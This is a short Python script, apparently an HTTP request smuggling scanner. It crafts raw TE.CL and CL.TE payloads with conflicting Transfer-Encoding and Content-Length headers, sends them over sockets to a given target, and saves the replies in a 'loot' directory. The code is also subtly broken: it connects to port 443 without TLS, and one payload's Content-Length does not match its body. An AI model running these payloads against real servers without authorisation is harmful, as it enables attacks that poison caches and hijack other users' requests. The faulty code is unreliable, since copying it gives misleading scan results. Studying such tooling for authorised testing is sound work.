import socket
import os
from urllib.parse import urlparse
from datetime import datetime

def run_scanner(target):
    log_file = f"loot/{target.replace('https://','').replace('http://','').replace('/','_')}_scan.txt"
    os.makedirs("loot", exist_ok=True)

    print(f"\n[*] Starting scan on: {target}")
    print(f"[*] Results will be saved to {log_file}\n")

    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    # 1. TE.CL Smuggle
    te_cl_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "0\r\n\r\nSMUG"
    )

    # 2. CL.TE Smuggle
    cl_te_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "SMUG"
    )

    payloads = {
        "TE.CL": te_cl_payload,
        "CL.TE": cl_te_payload
    }

    with open(log_file, "w") as f:
        for name, raw in payloads.items():
            print(f"[>] Testing: {name}")
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(10)
                    s.connect((host, port))
                    s.sendall(raw.encode())
                    response = s.recv(4096).decode(errors="ignore")
                    f.write(f"\n--- {name} ---\n")
                    f.write(response + "\n")
                    print(f"  ↳ Response snippet:\n{response[:120]}")
            except Exception as e:
                f.write(f"\n--- {name} ---\nERROR: {e}\n")
                print(f"  [!] Error: {e}")

    print(f"\n[+] Scan complete. Check {log_file}\n")
